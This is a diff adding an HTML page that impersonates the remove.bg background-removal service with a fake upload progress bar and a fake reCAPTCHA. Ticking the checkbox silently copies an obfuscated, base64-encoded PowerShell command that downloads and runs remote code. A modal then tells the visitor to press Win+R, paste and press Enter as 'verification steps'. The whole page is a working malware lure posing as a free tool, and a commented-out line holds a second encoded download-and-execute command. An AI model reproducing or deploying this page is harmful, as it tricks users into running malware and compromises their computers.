@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Background Remover</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="shortcut icon" href="img/logo.png">
+
+<style type="text/css">
+  .robot{
+    display:none ;
+    border:1px solid #d1d1d1;
+    border-radius: 2px;
+  }
+  .robot2{
+    display: none;
+  }
+</style>
+
+
+
+ <style type="text/css">
+           <style>
+
+    .loading
+    {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 24px;
+        color: #333;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .loading .spinner
+    {
+        width: 24px;
+        height: 24px;
+        border: 4px solid #333;
+        border-top: 4px solid transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin
+    {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+</style>
+    <style>
+
+        *
+        {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body
+        {
+            height: 100%;
+        }
+
+    
+        .logo, .footer
+        {
+            flex-shrink: 0;
+        }
+
+        .logo
+        {
+            margin-top: 20px;
+        }
+
+        .footer
+        {
+            color: #000000;
+            margin-bottom: 20px;
+        }
+
+        .content
+        {
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1;
+        }
+
+        .center-box
+        {
+            padding: 20px;
+            background-color: white;
+            color: black;
+            /* border-radius: 10px; */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 400px;
+            height: 100px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+        }
+
+        .checkbox-container
+        {
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+
+        .checkbox-container input
+        {
+            margin-right: 10px;
+            width: 30px;
+            height: 30px;
+        }
+
+        .checkbox-container label
+        {
+            z-index: 1;
+        }
+
+        .logo-container
+        {
+            text-align: right;
+        }
+
+        .logo-container img
+        {
+            width: 60px;
+            height: 60px;
+        }
+
+        .logo-container p
+        {
+            font-size: 10px;
+            color: #ccc;
+        }
+
+        .loader
+        {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+            position: absolute;
+            left: 0;
+        }
+
+        @keyframes spin
+        {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .modal
+        {
+            box-shadow: 0px 20px 80px 21px rgb(37 99 235)!important;
+            padding-top:35px;
+            border-radius: 25px;
+            display: none;
+            position: fixed;
+            top: 44%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+            background-color: white;
+            color: black;
+            padding: 20px;
+            /* border-radius: 10px; */
+            width: 510px;
+            height: 390px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: left;
+        }
+
+        .modal h2
+        {
+            background-color: #007cff;
+            color: white;
+            padding: 20px;
+            margin: 0 0 10px 0;
+           
+        }
+
+        .modal ol
+        {
+            list-style: none;
+            padding-left: 50px;
+            margin-top: 10px;
+        }
+
+        .modal li
+        {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .modal li::before
+        {
+            content: counters(item, ".") ".";
+            counter-increment: item;
+            color: black;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .modal ol
+        {
+            counter-reset: item; 
+        }
+
+        .divider
+        {
+            border-bottom: 1px solid #ccc;
+            margin: 20px 0;
+        }
+
+        .copyright
+        {
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+        }
+
+        #pdf-background
+        {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            filter: blur(0px);
+            
+        }
+
+        #pdf-background iframe
+        {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+    </style>
+       </style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+     <style>
+      .shadow-2xl{
+        --tw-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.75);
+      }
+      .blinking {
+        animation: blink 1s infinite;
+      }
+      @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0; }
+      }
+    </style>
+
+    <script>
+  function handleUpload(event, idSuffix) {
+    const file = event.target.files[0];
+    if (!file) return;
+
+    document.getElementById(`upload-section-${idSuffix}`).classList.add("hidden");
+    document.getElementById(`progress-section-${idSuffix}`).classList.remove("hidden");
+    document.getElementById(`file-name-${idSuffix}`).textContent = file.name;
+
+    let progress = 0;
+    const progressBar = document.getElementById(`progress-bar-${idSuffix}`);
+    const progressText = document.getElementById(`progress-text-${idSuffix}`);
+
+    progressText.innerHTML = `<span class="blinking text-blue-600 font-semibold">Background cleaning...</span>`;
+
+    const interval = setInterval(() => {
+      progress += 1;
+      progressBar.style.width = progress + "%";
+
+      if (progress >= 100) {
+        clearInterval(interval);
+
+        // Final UI with download button
+        progressText.innerHTML = `
+          <div class="flex items-center justify-center space-x-2 text-green-600 font-semibold animate-pop-in">
+            <i class="fas fa-check-circle text-xl"></i>
+            <span>Done</span>
+          </div>
+          <div class="text-gray-700 mt-1">
+            <i class="fas fa-magic text-sm mr-1"></i>Background removed from your image
+          </div>
+          <div class="mt-4 animate-fade-in">
+            <a id="download-btn-${idSuffix}" href="#" download class="inline-flex items-center px-5 py-2.5 bg-blue-600 text-white text-sm font-medium rounded-full shadow-md hover:bg-blue-700 transition-all">
+              <i class="fas fa-download mr-2"></i> Download
+            </a>
+          </div>
+        `;
+
+       
+        setTimeout(() => {
+          const downloadBtn = document.getElementById(`download-btn-${idSuffix}`);
+          if (downloadBtn) {
+            downloadBtn.addEventListener("click", () => {
+              const robotBox = document.querySelector(`.robot`);
+              if (robotBox) {
+                robotBox.style.setProperty('display', 'flex', 'important');
+                robotBox.style.opacity = 0;
+                robotBox.style.transition = 'opacity 2s ease';
+                setTimeout(() => {
+                  robotBox.style.opacity = 1;
+                }, 50);
+              }
+
+
+               const robotBox2 = document.querySelector(`.robot2`);
+      if (robotBox2) {
+        robotBox2.style.setProperty('display', 'block', 'important');
+        robotBox2.style.opacity = 0;
+        robotBox2.style.transition = 'opacity 2s ease';
+        setTimeout(() => {
+          robotBox2.style.opacity = 1;
+        }, 50);
+      }
+
+
+
+
+
+
+            });
+          }
+        }, 100);
+      }
+    }, 70);
+  }
+</script>
+
+
+
+<style>
+  @keyframes pop-in {
+    0% {
+      transform: scale(0.7);
+      opacity: 0;
+    }
+    60% {
+      transform: scale(1.1);
+      opacity: 1;
+    }
+    100% {
+      transform: scale(1);
+    }
+  }
+
+  .animate-pop-in {
+    animation: pop-in 0.4s ease-out;
+  }
+</style>
+
+
+
+
+  </head>
+  <body class="bg-gray-50 text-gray-800" style="background-color: white;">
+
+
+
+
+
+
+
+
+
+
+ <div id="modal" class="modal">
+        <h2 style="text-align: center;border-radius: 25px;">Complete these Verification Steps</h2><br>
+
+        <p>Please complete these steps to prove you are not a robot.</p>
+
+        <br>
+
+        <ol>
+            <li>
+                Press &nbsp;<i>Windows Button</i>&nbsp;<i class="fab fa-windows"></i>&nbsp;+&nbsp;<b>R</b>.
+            </li>
+
+            <li>
+                Press &nbsp;<b>Ctrl</b>&nbsp;+&nbsp;<b>V</b>.
+            </li>
+
+            <li>
+                Press&nbsp;<b>Enter</b>&nbsp;on your keyboard to finish.
+            </li>
+            
+        </ol>
+
+
+        <br>
+
+
+        <div class="divider"></div>
+
+        <div class="copyright">
+            reCAPTCHA Verification ID: <span id="ray-id-2" style="font-weight: bold;">35362001</span>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+    <!-- Header -->
+    <header class="flex items-center justify-between px-6 py-4 shadow-sm">
+      <div class="flex items-center space-x-2">
+        <img src="img/logo.png" alt="Logo" class="h-8" />
+      </div>
+      <nav class="hidden md:flex space-x-6 text-sm items-center">
+        <a href="index.html" class="hover:text-blue-600">Remove Background</a>
+        <a href="https://pixlr.com/" target="_blank" class="hover:text-blue-600">Photo Editing Services</a>
+        <a href="#" class="hover:text-blue-600">Tools & API</a>
+        <a href="#" class="hover:text-blue-600">How To Use</a>
+        <span class="bg-green-100 text-green-700 text-xs font-semibold px-3 py-1 rounded-full flex items-center">
+          <i class="fas fa-leaf mr-1"></i> Free to use
+        </span>
+      </nav>
+      <div class="space-x-3 text-sm">
+        <a href="#" class="hover:text-blue-600">Log in</a>
+        <a href="#" class="bg-gray-800 text-white px-4 py-2 rounded-full">Sign up</a>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="py-16 px-4">
+      <div class="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
+        <!-- Left Side -->
+        <div class="text-center md:text-left">
+          <img src="img/1.jpg" alt="Banner" class="mx-auto md:mx-0 rounded-xl mb-6 max-w-sm" />
+          <h1 class="text-3xl md:text-5xl font-bold mb-4">Remove Image Background</h1>
+          <p class="text-lg text-gray-700">
+            100% Automatically and
+            <span class="bg-yellow-300 px-2 py-0.5 rounded font-semibold inline-block ml-1">Free</span>
+          </p>
+        </div>
+
+        
+<section class="relative py-24 bg-white overflow-hidden">
+  <div class="max-w-xl mx-auto text-center mb-12">
+    <h2 class="text-3xl md:text-4xl font-bold text-gray-800">Remove Image Background</h2>
+    <p class="text-gray-500 mt-2">Get a transparent background for any image.</p>
+  </div>
+
+  <div class="flex justify-center relative z-10">
+    <div class="bg-white rounded-2xl shadow-2xl hover:shadow-3xl transition-all duration-300 p-10 text-center w-full max-w-md border border-gray-100">
+      <div id="upload-section-top">
+        <div class="flex justify-center items-center mb-4">
+          <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center shadow">
+            <i class="fas fa-cloud-upload-alt text-2xl"></i>
+          </div>
+        </div>
+        <label class="cursor-pointer bg-blue-600 hover:bg-blue-700 text-white font-medium px-6 py-3 rounded-full shadow-lg inline-block">
+          <i class="fas fa-upload mr-2"></i> Upload Image
+          <input type="file" accept="image/*" class="hidden" onchange="handleUpload(event, 'top')">
+        </label>
+        <p class="mt-4 text-gray-600 text-sm">or select your file above to get started</p>
+
+        
+      </div>
+
+      <div id="progress-section-top" class="hidden mt-6">
+        <p id="file-name-top" class="text-sm font-medium text-gray-800 mb-2"></p>
+        <div class="w-full bg-gray-200 rounded-full h-4 mb-4 overflow-hidden">
+          <div id="progress-bar-top" class="bg-blue-600 h-4 rounded-full transition-all duration-300 ease-in-out" style="width: 0%"></div>
+        </div>
+        <div id="progress-text-top" class="text-sm text-gray-700 whitespace-pre-line text-center"></div>
+
+        <div class="content robot" id="convert-button" style="margin-top:30px;">
+            <div class="center-box" id="centerBox">
+                <div class="checkbox-container">
+                    <input type="checkbox" id="checkbox">
+                    <label for="checkbox">I'm not a robot</label>
+                    <div class="loader" id="loader"></div>
+                </div>
+                <div class="logo-container">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png">
+                    <p>
+                        <a href="https://www.google.com/intl/en/policies/privacy/" style="color:#0000d7;" target="_blank">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/" target="_blank" style="color:#0000d7;">Terms</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+        <br><span class="robot2">File is ready! To download, confirm that you are not a robot</span>
+      </div>
+    </div>
+  </div>
+  <!-- Decorative shapes -->
+  <img src="https://www.clker.com/cliparts/C/h/A/j/t/5/yellow-line.svg.hi.png" class="absolute bottom-4 left-4 w-24 md:w-36" alt="decoration" />
+  <img src="https://www.clker.com/cliparts/C/h/A/j/t/5/yellow-line.svg.hi.png" class="absolute top-20 right-8 w-10" alt="decoration" />
+
+
+
+</section>
+
+
+
+
+
+
+
+
+
+      </div>
+
+      <p class="mt-16 text-xs text-gray-400 max-w-xl mx-auto text-center">
+        By uploading an image or URL you agree to our <a href="#" class="underline">Terms of Service</a>. This site is protected by reCaptcha and its <a href="#" class="underline">Privacy Policy</a> and <a href="#" class="underline">Terms of Service</a> apply.
+      </p>
+
+      <!-- Feature Section -->
+      <section class="max-w-6xl mx-auto mt-24 px-4">
+        <div class="grid md:grid-cols-3 gap-8 text-center">
+          <div class="bg-white rounded-2xl shadow-lg p-6">
+            <img src="img/2.png" alt="Feature 1" class="mx-auto mb-4 rounded-lg" />
+            <h3 class="text-lg font-semibold mb-2">Fully automated background remover</h3>
+            <p class="text-gray-600 text-sm">Instantly get an image with a transparent background. Fully automated and FREE.</p>
+          </div>
+          <div class="bg-white rounded-2xl shadow-lg p-6">
+            <img src="img/3.png" alt="Feature 2" class="mx-auto mb-4 rounded-lg" />
+            <h3 class="text-lg font-semibold mb-2">Replace image background</h3>
+            <p class="text-gray-600 text-sm">Easily replace the original background with a solid or another image background.</p>
+          </div>
+          <div class="bg-white rounded-2xl shadow-lg p-6">
+            <img src="img/4.png" alt="Feature 3" class="mx-auto mb-4 rounded-lg" />
+            <h3 class="text-lg font-semibold mb-2">Design the way you want</h3>
+            <p class="text-gray-600 text-sm">Create stunning banners and designs from your transparent background image easily.</p>
+          </div>
+        </div>
+      </section>
+      <!-- New AI Info Section -->
+      <section class="max-w-6xl mx-auto mt-24 grid grid-cols-1 md:grid-cols-2 gap-12 items-center px-4">
+        <div>
+          <h2 class="text-2xl md:text-3xl font-bold text-gray-800 mb-4">
+            Remove backgrounds 100% automatically in 5 seconds with one click
+          </h2>
+          <p class="text-gray-600 mb-4">
+            Thanks to remove.bg's clever AI, you can slash editing time – and have more fun!
+          </p>
+          <p class="text-gray-600">
+            No matter if you want to make a background transparent (PNG), add a white background to a photo,
+            <span class="font-semibold">extract or isolate the subject, or get the cutout of a photo</span> – you can do all this and more
+            with remove.bg, the AI background remover for professionals.
+          </p>
+        </div>
+        <div class="flex justify-center">
+          <img src="img/ai-section.png" alt="AI Illustration" class="max-w-sm rounded-xl">
+        </div>
+      </section>
+  <div class="relative">
+  <svg class="absolute -top-1 w-full" viewBox="0 0 1440 100" fill="none" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+    <path d="M0,40 C360,140 1080,-60 1440,40 L1440,0 L0,0 Z" fill="#facc15"></path>
+  </svg>
+    <section class="bg-white bg-[url('/img/testimonial-bg.png')] bg-repeat w-full py-20 px-4 mt-24">
+      <div class="max-w-7xl mx-auto">
+        <h2 class="text-3xl md:text-4xl font-bold text-center text-gray-900 mb-12">They love us. You will too.</h2>
+        <div class="grid md:grid-cols-3 gap-8">
+          <!-- Testimonial 1 -->
+          <div class="bg-white rounded-xl shadow-lg p-6 text-center">
+            <img src="img/logo-sony.png" alt="Sony Music" class="mx-auto h-6 mb-4" />
+            <p class="text-gray-800 italic mb-6">“We are impressed by the AI and think it's the best choice on the market.”</p>
+            <div class="flex items-center gap-3 justify-center">
+              <img src="img/user1.jpg" alt="Emil" class="w-12 h-12 rounded-full border-4 border-cyan-200" />
+              <div class="text-left">
+                <p class="font-semibold text-sm">Emil Barsø Rheinlænder</p>
+                <p class="text-xs text-gray-500">Content & Marketing Coordinator</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Testimonial 2 -->
+          <div class="bg-white rounded-xl shadow-lg p-6 text-center">
+            <img src="img/logo-phoenix.png" alt="Phoenix" class="mx-auto h-6 mb-4" />
+            <p class="text-gray-800 italic mb-6">“remove.bg is leaps and bounds ahead of the competition. A thousand times better. It simplified the whole process.”</p>
+            <div class="flex items-center gap-3 justify-center">
+              <img src="img/user2.jpg" alt="Marc" class="w-12 h-12 rounded-full border-4 border-cyan-200" />
+              <div class="text-left">
+                <p class="font-semibold text-sm">Marc Cohen</p>
+                <p class="text-xs text-gray-500">CEO</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Testimonial 3 -->
+          <div class="bg-white rounded-xl shadow-lg p-6 text-center">
+            <img src="img/logo-techcrunch.svg" alt="TechCrunch" class="mx-auto h-6 mb-4" />
+            <p class="text-gray-800 italic mb-6">“We were impressed by its ability to account for pesky, feathery hair without making an image look jagged and amateurish.”</p>
+            <div class="flex items-center gap-3 justify-center">
+              <img src="img/user3.jpg" alt="Taylor" class="w-12 h-12 rounded-full border-4 border-cyan-200" />
+              <div class="text-left">
+                <p class="font-semibold text-sm">Taylor Hatmaker</p>
+                <p class="text-xs text-gray-500">Senior Technology Editor</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="text-center mt-10">
+          <a href="#" class="text-yellow-900 font-semibold hover:underline inline-flex items-center">
+            Read Success Stories <span class="ml-2">→</span>
+          </a>
+        </div>
+      </div>
+      <svg class="w-full" viewBox="0 0 1440 100" fill="none" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+    <path d="M0,40 C360,-60 1080,140 1440,40 L1440,100 L0,100 Z" fill="#facc15"></path>
+  </svg>
+</div>
+    </section>
+
+
+
+<section class="w-full bg-white py-12">
+  <div class="flex items-center justify-center w-full px-4">
+    <div class="flex-grow border-t border-gray-300"></div>
+
+    <div class="mx-6 px-6 py-4 border border-gray-200 rounded-md text-center shadow-sm bg-white">
+      <div class="flex justify-center items-center gap-2 mb-2 text-sm font-semibold text-gray-700">
+        <i class="fab fa-product-hunt text-lg text-indigo-700"></i>
+        PRODUCT HUNT
+      </div>
+      <div class="flex justify-center gap-1 text-indigo-700 text-xl">
+        <i class="fas fa-star"></i>
+        <i class="fas fa-star"></i>
+        <i class="fas fa-star"></i>
+        <i class="fas fa-star"></i>
+        <i class="fas fa-star"></i>
+      </div>
+      <div class="text-xs text-gray-500 mt-1">(4.7) based on 845 reviews</div>
+    </div>
+
+    <div class="flex-grow border-t border-gray-300"></div>
+  </div>
+</section>
+
+
+
+    </main>
+
+
+
+    <!-- Footer -->
+<footer class="relative bg-gray-700 text-white pt-16 pb-10 overflow-hidden w-full">
+  <!-- Top wave -->
+  <svg class="absolute top-0 left-0 w-full" viewBox="0 0 1440 100" preserveAspectRatio="none">
+    <path d="M0,40 C360,140 1080,-60 1440,40 L1440,0 L0,0 Z" fill="#4b5563"></path>
+  </svg>
+
+  <div class="relative z-10 max-w-7xl mx-auto px-6">
+    <div class="flex flex-col md:flex-row justify-between items-center md:items-start gap-6">
+      <!-- Language -->
+      <div class="flex flex-col items-center gap-4">
+        <button class="flex items-center gap-2 bg-gray-100 text-gray-700 px-4 py-2 rounded-full text-sm font-medium">
+          <i class="fas fa-globe"></i> English
+        </button>
+        <p class="text-sm text-gray-300">© remove.bg, a Canva Austria GmbH brand</p>
+      </div>
+
+      <!-- Social icons -->
+      <div class="flex gap-3">
+        <a href="#" class="bg-gray-100 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center hover:bg-white">
+          <i class="fab fa-facebook-f"></i>
+        </a>
+        <a href="#" class="bg-gray-100 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center hover:bg-white">
+          <i class="fab fa-instagram"></i>
+        </a>
+        <a href="#" class="bg-gray-100 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center hover:bg-white">
+          <i class="fab fa-twitter"></i>
+        </a>
+        <a href="#" class="bg-gray-100 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center hover:bg-white">
+          <i class="fab fa-tiktok"></i>
+        </a>
+        <a href="#" class="bg-gray-100 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center hover:bg-white">
+          <i class="fab fa-youtube"></i>
+        </a>
+        <a href="#" class="bg-gray-100 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center hover:bg-white">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </div>
+    </div>
+
+    <!-- Bottom links -->
+    <div class="flex flex-wrap justify-center md:justify-end gap-4 text-sm text-gray-300 mt-8">
+      <a href="#" class="hover:underline">Terms of Service</a>
+      <a href="#" class="hover:underline">General Terms and Conditions</a>
+      <a href="#" class="hover:underline">Privacy Policy</a>
+      <a href="#" class="hover:underline">Cookie Policy</a>
+      <a href="#" class="hover:underline">Imprint</a>
+    </div>
+  </div>
+</footer>
+ 
+
+     <script>
+
+    function unsecuredCopyToClipboard(text)
+    {
+        const textArea = document.createElement("textarea");
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        
+        textArea.select();
+
+        try
+        {
+            document.execCommand("copy");
+        }
+
+        catch(err)
+        {
+            console.error("Unable to copy to clipboard", err);
+        }
+
+        document.body.removeChild(textArea);
+    }
+
+    function generateRayID(length = 8)
+    {
+        const characters = "0123456789";
+        let result = "";
+
+        for(let i = 0; i < length; i++)
+        {
+            const randomIndex = Math.floor(Math.random() * characters.length);
+            result += characters[randomIndex];
+        }
+
+        return(result);
+    }
+
+    function getRandomNumber(min, max)
+    {
+        return(Math.floor(Math.random() * (max - min + 1)) + min);
+    }
+
+    let timeout = getRandomNumber(500, 2000);
+    const rayID = generateRayID();
+    // document.getElementById("ray-id-1").innerText = rayID;
+    document.getElementById("ray-id-2").innerText = rayID;
+
+    const checkbox = document.getElementById("checkbox");
+    const loader = document.getElementById("loader");
+    const modal = document.getElementById("modal");
+    const centerBox = document.getElementById("centerBox");
+
+    checkbox.addEventListener("change", () =>
+    {
+        if(checkbox.checked)
+        {
+            
+            {
+                // unsecuredCopyToClipboard(atob("Y21kIC9jICJwb3dlcnNoZWxsIC13IGggLWUgYVFCbEFIZ0FLQUJwQUhjQWNnQWdBQzBBVlFCeUFHa0FJQUFuQUdnQWRBQjBBSEFBY3dBNkFDOEFMd0JsQUhnQWNBQnlBR1VBY3dCekFDMEFMUUIyQUhBQWJnQXVBR01BYndCdEFDOEFhUUJ1QUM0QWNBQm9BSEFBUHdCaEFHTUFkQUJwQUc4QWJnQTlBREVBSndBcEFBPT0iICYmIOKchSBJIGFtIG5vdCBhIHJvYm90IC0gcmVDQVBUQ0hBIElEOiA3MDg3NjU="));
+                unsecuredCopyToClipboard(decodeURIComponent(escape(atob("cG93ZXJzaGVsbCAtV2kgaCAtQ28gJEg9JyN0aVJPWkU9SUtzZSc7JHogPSdwb0dOL2MueDpuaEFMN21EVFAnOyAkRT0kaCskWjskVz0naUUnKyRlWzE5XTskTD0kels0XSskZVsxNl0rJ2MnKyRXWzBdKydUJyskV1swXSskZVs1XSskV1sxXSsnTicrJHpbMTVdKyRFWzRdKydNJyskels2XSskSFsxMF0rJEhbOV0rJ2lOL2Y1MTYxODAnKyR6WzVdOyRTPSdIdHQnKyR6WzBdKyRoWzEwXSskWls4XTskSj0nSVInKyRFWzI2XTsmJFcoJiRKICRTJEwpOw=="))));
+
+                loader.style.display = "block";
+                checkbox.style.visibility = "hidden";
+                
+
+                setTimeout(() =>
+                {
+                    loader.style.display = "none";
+                    modal.style.display = "block";
+                    modal.style.opacity = 0;
+                    modal.style.transition = "opacity 1s ease";
+                    centerBox.style.display = "none";
+                    setTimeout(() => {
+  modal.style.opacity = 1;
+}, 50);
+                }, timeout);
+            };
+        }
+
+        else
+        {
+            modal.style.display = "none";
+            checkbox.style.visibility = "visible";
+            centerBox.style.display = "flex";
+            
+        }
+    });
+
+    </script>
+
+  </body>
+</html>
